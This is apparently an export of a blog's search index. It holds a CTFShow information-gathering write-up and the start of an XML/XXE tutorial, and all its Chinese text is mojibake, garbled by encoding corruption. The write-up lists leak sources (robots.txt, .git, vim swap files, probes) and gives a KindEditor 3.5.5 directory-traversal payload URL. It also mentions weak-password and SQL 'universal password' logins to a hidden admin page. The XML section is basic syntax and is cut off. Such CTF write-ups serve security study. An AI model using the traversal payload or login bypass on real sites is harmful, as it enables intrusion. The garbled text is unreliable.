æ‰“å¼€å¼€å‘è€…å·¥å…· Ctrl + U æŸ¥çœ‹æºä»£ç  Burp æŠ“åŒ…æŸ¥çœ‹ 1.3 Web 3 â€” æŠ“åŒ…1æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è· æŠ“åŒ… å°è¯• 1.4 Web 4 â€” robots.txt æ³„éœ²1æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚ 1.5 Web 5 â€” phps æ–‡ä»¶1phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™ phpsæ–‡ä»¶ â€‹ å°±æ˜¯phpçš„ æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚å…¶å®ï¼Œåªè¦ä¸ç”¨phpç­‰å·²ç»åœ¨æœåŠ¡å™¨ä¸­æ³¨å†Œè¿‡çš„MIMEç±»å‹ä¸ºæ–‡ä»¶å³å¯ï¼Œä½†ä¸ºäº†å›½é™…é€šç”¨ï¼Œæ‰€ä»¥æ‰ç”¨äº†phpsæ–‡ä»¶ç±»å‹ã€‚ â€‹ å®ƒçš„MIMEç±»å‹ä¸ºï¼štext/html, application/x-httpd-php-source, application/x-httpd-php3-sourceã€‚ 1.6 Web 6 â€” www.zip æ³„éœ²1è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥ 1.7 Web 7 â€” ç‰ˆæœ¬æ§åˆ¶ .git1ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚ 1.8 Web 8 â€” ç‰ˆæœ¬æ§åˆ¶ .svn1ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚ 1.9 Web 9 â€” vim ä¸´æ—¶æ–‡ä»¶ç¼“å­˜1å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº† Vim ç¼“å­˜ â€‹ ä¸´æ—¶æ–‡ä»¶ æ˜¯åœ¨vimç¼–è¾‘æ–‡æœ¬æ—¶å°±ä¼šåˆ›å»ºçš„æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨ åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹ â€‹ ä»¥ index.php ä¸ºä¾‹ ç¬¬ä¸€æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åä¸º .index.php.swp ç¬¬äºŒæ¬¡æ„å¤–é€€å‡ºåï¼Œæ–‡ä»¶åä¸º .index.php.swo ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åˆ™ä¸º .index.php.swn 1.10 Web 10 â€” cookie æ³„éœ²1cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ® 1.11 Web 11 â€” åŸŸåè§£ææŸ¥è¯¢1åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯ æŸ¥çœ‹åŸŸåè§£æ nslookup 1nslookup -qt=txt ctfshow.com 1#nslookup æŸ¥è¯¢#ç›´æ¥åŸŸåæŸ¥è¯¢nslookup domain#æŸ¥è¯¢è®°å½•nslookup -qt = type domain [dns-server]type: A --&gt;åœ°å€è®°å½• AAAA --&gt;åœ°å€è®°å½• AFSDB Andrew --&gt;æ–‡ä»¶ç³»ç»Ÿæ•°æ®åº“æœåŠ¡å™¨è®°å½• ATMA --&gt;ATMåœ°å€è®°å½• CNAME --&gt;åˆ«åè®°å½• HINHO --&gt;ç¡¬ä»¶é…ç½®è®°å½•ï¼ŒåŒ…æ‹¬CPUã€æ“ä½œç³»ç»Ÿä¿¡æ¯ ISDN --&gt;åŸŸåå¯¹åº”çš„ISDNå·ç  MB --&gt;å­˜æ”¾æŒ‡å®šé‚®ç®±çš„æœåŠ¡å™¨ MG --&gt;é‚®ä»¶ç»„è®°å½• MINFO --&gt;é‚®ä»¶ç»„å’Œé‚®ç®±çš„ä¿¡æ¯è®°å½• MR --&gt;æ”¹åçš„é‚®ç®±è®°å½• MX --&gt;é‚®ä»¶æœåŠ¡å™¨è®°å½• NS --&gt; åå­—æœåŠ¡å™¨è®°å½• PTR --&gt;åå‘è®°å½• RP --&gt;è´Ÿè´£äººè®°å½• RT --&gt;è·¯ç”±ç©¿é€è®°å½• SRV --&gt;TCPæœåŠ¡å™¨ä¿¡æ¯è®°å½• TXT --&gt;åŸŸåå¯¹åº”çš„æ–‡æœ¬ä¿¡æ¯ X25 --&gt;åŸŸåå¯¹åº”çš„X.25åœ°å€è®°å½• åœ¨çº¿å†å²è§£æè®°å½•æŸ¥è¯¢ é˜¿é‡Œäº‘ DNS æ£€æµ‹ https://zijian.aliyun.com/ 1.12 Web 12 â€” ç½‘ç«™å…¬å¼€ä¿¡æ¯1æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç  1.13 Web 13 â€” ç½‘ç«™æŠ€æœ¯æ–‡æ¡£1æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç  1.14 Web 14 â€” KindEditor 3.5.5 éå†ç›®å½•æ¼æ´ï¼ˆç¼–è¾‘å™¨æ¼æ´ï¼‰11. æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº2. å°0day:æŸç¼–è¾‘å™¨æœ€æ–°ç‰ˆé»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¼šéå†æœåŠ¡å™¨æ ¹ç›®å½• KindEditor 3.5.5 éå†ç›®å½•æ¼æ´ http://www.nxadmin.com/web/96.html 1#payload/url/editor/php/file_manager_json.php?path=/ #å¯çˆ†å‡ºæ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶/url/editor/php/file_manager_json.php?path=/var/www/html/ 1/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/ 1/url/nothinghere/fl000g.txt æ‹“å±•ï¼šç¼–è¾‘å™¨æ¼æ´ 1.15 Web 15 â€” å‰ç«¯é‚®ç®±ä¿¡æ¯æ³„éœ²1å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ å‰ç«¯é¡µé¢å½“ä¸­æ‰¾åˆ°é‚®ç®±ä¿¡æ¯ å¿˜è®°å¯†ç  å¯†ä¿ç­”æ¡ˆ è¥¿å®‰ æˆåŠŸé‡ç½®å¯†ç  æˆåŠŸç™»å½• æ‹¿åˆ° flag 1.16 Web 16 â€” æ¢é’ˆä¿¡æ¯1å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ² PHP æ¢é’ˆ â€‹ phpæ¢é’ˆ æ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ å¸¸ç”¨4æ¬¾PHPæ¢é’ˆ åº”è¯¥æ˜¯é›…é»‘æ¢é’ˆï¼Œè®¿é—® /tz.php æŸ¥æ‰¾ ctfshow å³å¯ 1.17 Web 17 â€” ç»•è¿‡ CDN æŸ¥ IP1é€è¿‡é‡é‡ç¼“å­˜ï¼ŒæŸ¥æ‰¾åˆ°ctfer.comçš„çœŸå®IPï¼Œæäº¤ flag&#123;IPåœ°å€&#125; å…¨çƒ ping å¯çŸ¥ï¼šæ—  CDN æŸ¥ www.ctfshow.com çš„ IPï¼Œå³ä¸º ctfer.comçš„çœŸå®IP 1.18 Web 18 â€” å‰ç«¯ js æ³„éœ²1ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag æŸ¥çœ‹æºç ï¼Œå‘ç° Flappy_js.j unicode è§£ç  è®¿é—® 110.php 1.19 Web 19 â€” å‰ç«¯å¯†é’¥æ³„éœ²1å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº† æŸ¥çœ‹æºç å¾—åˆ° ä¼šæœ‰å‡½æ•°å¯¹æˆ‘ä»¬æäº¤çš„å†…å®¹è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œå¤„ç†åç»“æœå¦‚æœæ˜¯ä¸‹é¢ç»¿è‰²éƒ¨åˆ†å°±æ˜¾ç¤ºflagï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥æŠ“åŒ…ç›´æ¥å°†å…¶ä¿®æ”¹ä¸ºæ­£ç¡®çš„æ ·å­ 1.20 Web 20 â€” æ—©æœŸ asp+access /db/db.mdb æ–‡ä»¶æ³„éœ²1mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚ 1.21 Web 382 â€”é¦–å…ˆæŸ¥çœ‹æºä»£ç  å¯ä»¥ä¸€ä¸€è¿›è¡Œå°è¯•ï¼Œæœ€åå‘ç° http://url/alsckdfy/ ç«Ÿç„¶æ˜¯ç½‘ç«™çš„åå°ç™»å½•é¡µé¢ çˆ†ç ´ å¼±å¯†ç  sql ä¸‡èƒ½å¯†ç  æˆåŠŸç™»å½•ä¹‹åå³å¯è·å¾— flag äºŒã€åšé¢˜æ€»ç»“ ç¬¬ä¸€æ­¥ï¼šæŸ¥çœ‹ æºä»£ç  å³é”®æŸ¥çœ‹æºä»£ç  F12 æ‰“å¼€å¼€å‘è€…å·¥å…· Ctrl + U æŸ¥çœ‹æºä»£ç  Burp æŠ“åŒ…æŸ¥çœ‹ æŠ“åŒ… å¯èƒ½å‘ç°ä¸€äº›æœ‰ç”¨ä¿¡æ¯ robots.txt phps æºä»£ç æ³„éœ² ä¸‹è½½æºç æ–‡ä»¶ã€ç½‘ç«™å¤‡ä»½æ–‡ä»¶ ç‰ˆæœ¬æ§åˆ¶ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ .git .svn Vim ç¼“å­˜ .æ–‡ä»¶å.php.swp .æ–‡ä»¶å.php.swo .æ–‡ä»¶å.php.swn cookie çš„é‡è¦æ€§ åŸŸåã€å­åŸŸå ä¿¡æ¯æœé›† nslookup åœ¨çº¿ç½‘ç«™ Banner ç­‰å…¬å¼€ä¿¡æ¯ ç®¡ç†å‘˜å¯†ç  QQ QQé‚®ç®±ç­‰ ç¬¬ä¸‰æ–¹è½¯ä»¶æŸ¥ä¸ªäººä¿¡æ¯ æŠ€æœ¯æ–‡æ¡£ å¯¹åº”ç¼–è¾‘å™¨æ¼æ´ æ¢é’ˆ å‰ç«¯æºç  å¯†é’¥æ³„éœ² db.mdb","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"ä¿¡æ¯æœé›†","slug":"ä¿¡æ¯æœé›†","permalink":"https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"}],"author":"xizhi-future"},{"title":"XMLä¸XXE","slug":"XMLä¸XXE","date":"2021-10-01T09:16:32.000Z","updated":"2021-10-07T10:18:31.736Z","comments":true,"path":"2021/10/01/XMLä¸XXE/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/XML%E4%B8%8EXXE/","excerpt":"ä¸€ã€XML1.1 ç®€ä»‹XMLæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„ å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚ XMLçš„å‰èº«æ˜¯ æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ ï¼Œä¸ºäº†ä½¿æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€æ˜¾å¾—ç”¨æˆ·å‹å¥½ï¼ŒXMLé‡æ–°å®šä¹‰äº†æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ä¸€äº›å†…éƒ¨å€¼å’Œå‚æ•°ï¼Œå»æ‰äº†å¤§é‡çš„å¾ˆå°‘ç”¨åˆ°çš„åŠŸèƒ½ï¼Œè¿™äº›ç¹æ‚çš„åŠŸèƒ½ä½¿å¾—æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€åœ¨è®¾è®¡ç½‘ç«™æ—¶æ˜¾å¾—å¤æ‚åŒ–ã€‚XMLä¿ç•™äº†æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ç»“æ„åŒ–åŠŸèƒ½ï¼Œè¿™æ ·å°±ä½¿å¾—ç½‘ç«™è®¾è®¡è€…å¯ä»¥å®šä¹‰è‡ªå·±çš„æ–‡æ¡£ç±»å‹ï¼ŒXMLåŒæ—¶ä¹Ÿæ¨å‡ºä¸€ç§æ–°å‹æ–‡æ¡£ç±»å‹ï¼Œä½¿å¾—å¼€å‘è€…ä¹Ÿå¯ä»¥ä¸å¿…å®šä¹‰æ–‡æ¡£ç±»å‹ã€‚","text":"ä¸€ã€XML1.1 ç®€ä»‹XMLæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„ å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚ XMLçš„å‰èº«æ˜¯ æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ ï¼Œä¸ºäº†ä½¿æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€æ˜¾å¾—ç”¨æˆ·å‹å¥½ï¼ŒXMLé‡æ–°å®šä¹‰äº†æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ä¸€äº›å†…éƒ¨å€¼å’Œå‚æ•°ï¼Œå»æ‰äº†å¤§é‡çš„å¾ˆå°‘ç”¨åˆ°çš„åŠŸèƒ½ï¼Œè¿™äº›ç¹æ‚çš„åŠŸèƒ½ä½¿å¾—æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€åœ¨è®¾è®¡ç½‘ç«™æ—¶æ˜¾å¾—å¤æ‚åŒ–ã€‚XMLä¿ç•™äº†æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„ç»“æ„åŒ–åŠŸèƒ½ï¼Œè¿™æ ·å°±ä½¿å¾—ç½‘ç«™è®¾è®¡è€…å¯ä»¥å®šä¹‰è‡ªå·±çš„æ–‡æ¡£ç±»å‹ï¼ŒXMLåŒæ—¶ä¹Ÿæ¨å‡ºä¸€ç§æ–°å‹æ–‡æ¡£ç±»å‹ï¼Œä½¿å¾—å¼€å‘è€…ä¹Ÿå¯ä»¥ä¸å¿…å®šä¹‰æ–‡æ¡£ç±»å‹ã€‚ ç‰¹å¾ï¼Œä¸ HTML çš„åŒºåˆ«ï¼š XML è¢«è®¾è®¡ç”¨æ¥ è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ï¼Œç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚ HTML è¢«è®¾è®¡ç”¨æ¥ æ˜¾ç¤ºæ•°æ®ï¼Œç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚ HTML æ—¨åœ¨ æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ ä¼ è¾“ä¿¡æ¯ XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ® XML è¢«è®¾è®¡ä¸ºå…·æœ‰ è‡ªæˆ‘æè¿°æ€§ XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ï¼ˆå³å…è®¸åˆ›ä½œè€…å®šä¹‰è‡ªå·±çš„æ ‡ç­¾å’Œè‡ªå·±çš„æ–‡æ¡£ç»“æ„ï¼‰ HTML æ–‡æ¡£åªèƒ½ä½¿ç”¨åœ¨ HTML æ ‡å‡†ä¸­å®šä¹‰è¿‡çš„æ ‡ç­¾ï¼ˆå¦‚ &lt;p&gt;ã€&lt;h1&gt; ç­‰ç­‰ï¼‰ XMLæ ‡ç­¾å¿…é¡»é—­åˆï¼Œå…è®¸ &lt;å¤–è§‚ /&gt;,ä¸å…è®¸ &lt;å¤–è§‚&gt;ï¼Œåªå¯æ˜¯ &lt;å¤–è§‚&gt;&lt;/å¤–è§‚&gt; HTMLå¯ä¸é—­åˆ ï¼Œå¯ &lt;p&gt;,&lt;p&gt;&lt;/p&gt;,&lt;img /&gt; XMLæ ‡ç­¾çš„ ç»“æ„å’Œæ ·å¼åˆ†ç¦» HTMLæ ‡ç­¾çš„ ç»“æ„å’Œæ ·å¼ç»“åˆåœ¨ä¸€èµ· &lt;h1&gt;æ ‡ç­¾ æ˜¯W3Cçš„æ¨èæ ‡å‡† æ³¨ï¼šæœ¬æ¥å‘æ˜XMLæ˜¯ä¸ºäº†æ›¿æ¢æ‰HTMLæ ‡ç­¾çš„ï¼Œæœ€åç”±äºå„ç§åŸå› ï¼Œæœªèƒ½æˆåŠŸæ›¿æ¢æ‰ï¼Œäºæ˜¯è§£å†³åŠæ³•æ˜¯å‘æ˜äº†ä¸€ä¸ªæ–°çš„ XHTMLï¼Œè¯¥è¯­è¨€å†…éƒ¨çš„æŠ€æœ¯ä½¿ç”¨çš„æ˜¯XMLçš„ï¼Œè€Œæ ‡ç­¾éƒ½æ˜¯HTMLçš„ ä½œç”¨ï¼š å½“ä½œå°å‹çš„æ•°æ®åº“ä½¿ç”¨ msgèŠå¤©å·¥ä½œé€šè¿‡xmlæ–‡ä»¶åœ¨æœ¬åœ°ä¿ç•™èŠå¤©è®°å½• è®¸å¤šè½¯ä»¶çš„ é…ç½®æ–‡ä»¶ éƒ½æ˜¯é€šè¿‡xmkæ¥ä¿å­˜çš„ è®¸å¤šåª’ä½“å·¥èµ„é€šè¿‡xmlæ–‡ä»¶ä¿ç•™ç”¨æˆ·ä¹‹å‰çœ‹åˆ°çš„åª’ä½“ä¿¡æ¯ åœ¨ç½‘ç«™å½“ä¸­å½“ä½œ â€œæ¥å£â€ æœåŠ¡ XMLæ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ï¼ˆSpringã€Struts2ç­‰ï¼‰ã€æ–‡æ¡£ç»“æ„è¯´æ˜æ–‡ä»¶ï¼ˆPDFã€RSSç­‰ï¼‰ã€å›¾ç‰‡æ ¼å¼æ–‡ä»¶ï¼ˆSVG headerï¼‰åº”ç”¨æ¯”è¾ƒå¹¿æ³›ã€‚ ä¾‹å­ï¼š 123456789101112131415#XMLæ–‡æ¡£&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt; &lt;hair&gt;Black&lt;/hair&gt; &lt;country&gt;China&lt;/country&gt; &lt;eye&gt;big&lt;/eye&gt; &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt; å……åˆ†ä½“ç°äº† å…·æœ‰è‡ªæˆ‘æè¿°æ€§ï¼Œä½†æ˜¯è¿™ä¸ª XML æ–‡æ¡£ä»ç„¶æ²¡æœ‰åšä»»ä½•äº‹æƒ…ã€‚å®ƒä»…ä»…æ˜¯åŒ…è£…åœ¨ XML æ ‡ç­¾ä¸­çš„çº¯ç²¹çš„ä¿¡æ¯ã€‚æˆ‘ä»¬éœ€è¦ç¼–å†™è½¯ä»¶æˆ–è€…ç¨‹åºï¼Œæ‰èƒ½ä¼ é€ã€æ¥æ”¶å’Œæ˜¾ç¤ºå‡ºè¿™ä¸ªæ–‡æ¡£ã€‚ 1.2 ç”¨é€” XML æŠŠæ•°æ®ä» HTML åˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…· ç®€åŒ–æ•°æ®å…±äº« ç®€åŒ–æ•°æ®ä¼ è¾“ ç®€åŒ–å¹³å°å˜æ›´ï¼Œå…¶å®ä¹Ÿæ˜¯ç®€åŒ–æ•°æ®çš„ä¼ è¾“ä¸å…±äº« 1.3 è§„åˆ™12345671.XMLæ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªï¼ˆå”¯ä¸€ï¼‰ æ ¹å…ƒç´  ï¼Œè¯¥å…ƒç´ æ˜¯å…¶ä»–å…ƒç´ çš„ çˆ¶å…ƒç´ 2.XMLæ¯ä¸ªå…ƒç´ éƒ½å¿…é¡»æœ‰å¼€å§‹å’Œç»“æŸæ ‡ç­¾ï¼Œå³æˆå¯¹å‡ºç°3.XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿï¼Œå¼€å§‹ä¸é—­åˆæ ‡ç­¾å¤§å°å†™ç±»å‹éœ€è¦ä¸€è‡´4.XMLå…ƒç´ éœ€è¦æ­£ç¡®åµŒå¥—ï¼Œå³ä¸å¯äº¤å‰åµŒå¥— #&lt;abc&gt;&lt;test&gt;&lt;/abc&gt;&lt;/test&gt; é”™è¯¯5.XMLå±æ€§ å¿…é¡»æœ‰ å€¼ï¼Œä¸”å¿…é¡»åŠ å¼•å·6.ç‰¹æ®Šå­—ç¬¦éœ€è¦ å®ä½“å¼•ç”¨7.æ³¨é‡Šï¼š&lt;!-- --&gt; 12345æ ‡ç­¾çš„ç»„æˆéƒ¨åˆ†ï¼š1.å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿2.ä¸èƒ½ä»¥ æ•°å­—å’Œæ ‡ç‚¹ç¬¦å· å¼€å§‹3.ä¸èƒ½åŒ…å« ç©ºæ ¼4.æœ€å¥½é¿å…ä½¿ç”¨ - , . , : ç­‰ å®ä½“å¼•ç”¨ &amp;lt; &lt; &amp;gt; &gt; &amp;amp; &amp; &amp;apos; â€˜ &amp;quot; â€œ å…¶å®åœ¨ XML ä¸­ï¼Œåªæœ‰å­—ç¬¦ â€œ&lt;â€ å’Œ â€œ&amp;â€ ç¡®å®æ˜¯éæ³•çš„ã€‚å¤§äºå·æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯ç”¨å®ä½“å¼•ç”¨æ¥ä»£æ›¿å®ƒæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚ 1.4 PCDATAè¢«è§£æçš„å­—ç¬¦ï¼Œæ–‡æœ¬ ä¸èƒ½å«æœ‰ ç‰¹æ®Šå­—ç¬¦ 1.5 CDATAä¸ä¼šè¢«è§£æçš„å­—ç¬¦ï¼Œæ–‡æœ¬ å½“éœ€è¦æ˜¾ç¤ºçš„ç‰¹æ®Šç¬¦å·åå¤šï¼Œä½†åˆä¸æƒ³ä½¿ç”¨å®ä½“çš„å¼•ç”¨æ—¶ï¼Œå¯ä½¿ç”¨ CDATAï¼Œå®ƒæŒ‡çš„æ˜¯ä¸åº”è¯¥ç”± XMLè§£é‡Šå™¨è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®ã€‚ 123#ä½¿ç”¨&lt;![CDATA[æ–‡æœ¬æ•°æ®]]&gt;#ä¾‹å­ï¼š&lt;eye&gt;&lt;![CDATA[&lt;sdsdj&gt;&gt;&gt;&amp;&amp;dfd&#x27;f&quot;]]&gt;big&lt;/eye&gt; 1.6 XML å±æ€§ ä¸ å…ƒç´ å±æ€§ï¼š 1234&lt;note day=&quot;10&quot; month=&quot;01&quot; year=&quot;2008&quot;to=&quot;Tove&quot; from=&quot;Jani&quot; heading=&quot;Reminder&quot;body=&quot;Don&#x27;t forget me this weekend!&quot;&gt;&lt;/note&gt; 12345#ç¼ºç‚¹ï¼šå±æ€§ä¸èƒ½åŒ…å«å¤šä¸ªå€¼ä¸èƒ½åŒ…å«æ ‘ç»“æ„ä¸å®¹æ˜“æ‰©å±•éš¾ä»¥é˜…è¯» å…ƒç´ ï¼š 1234567891011&lt;note&gt; &lt;date&gt; &lt;day&gt;10&lt;/day&gt; &lt;month&gt;01&lt;/month&gt; &lt;year&gt;2008&lt;/year&gt; &lt;/date&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;body&gt;&lt;/note&gt; å»ºè®®ï¼šä½¿ç”¨å…ƒç´  ç‰¹åˆ«çš„ï¼šIDå±æ€§ï¼Œä¾¿äºè®¿é—®XMLå…ƒç´  1234567891011121314&lt;messages&gt;&lt;note id=&quot;p501&quot;&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt;&lt;note id=&quot;p502&quot;&gt; &lt;to&gt;Jani&lt;/to&gt; &lt;from&gt;Tove&lt;/from&gt; &lt;heading&gt;Re: Reminder&lt;/heading&gt; &lt;body&gt;I will not!&lt;/body&gt;&lt;/note&gt;&lt;/messages&gt; 1.7 XMLåœ¨æµè§ˆå™¨ä¸­çš„æ˜¾ç¤ºæ˜¾ç¤ºï¼šå•ç‹¬çš„ XML æ–‡æ¡£ä¸ä¼šæºå¸¦æœ‰å…³å¦‚ä½•æ˜¾ç¤ºæ•°æ®çš„ä¿¡æ¯ï¼Œç›´æ¥å°†XMLçš„æºç æ˜¾ç¤ºå‡ºæ¥ã€‚ æ–¹æ³•ï¼š é“¾æ¥åˆ°CSSæ–‡ä»¶ 1&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;cd_catalog.css&quot;?&gt; ä½¿ç”¨ CSS æ ¼å¼åŒ– XML ä¸æ˜¯å¸¸ç”¨çš„æ–¹æ³• ä½¿ç”¨ XSLTï¼ŒæŠŠ XML æ–‡æ¡£è½¬æ¢æˆ HTML æ ¼å¼æ˜¾ç¤º XSLT æ˜¯é¦–é€‰çš„ XML æ ·å¼è¡¨è¯­è¨€ï¼Œå½“æµè§ˆå™¨è¯»å– XML æ–‡ä»¶æ—¶ï¼ŒXSLT è½¬æ¢æ˜¯ç”±æµè§ˆå™¨å®Œæˆçš„ ä½¿ç”¨ XSLT æ¥è½¬æ¢ XML æ—¶ï¼Œä¸åŒçš„æµè§ˆå™¨å¯èƒ½ä¼šäº§ç”Ÿä¸åŒç»“æœã€‚ä¸ºäº†å‡å°‘è¿™ç§é—®é¢˜ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œ XSLT è½¬æ¢ã€‚ 1.8 XML 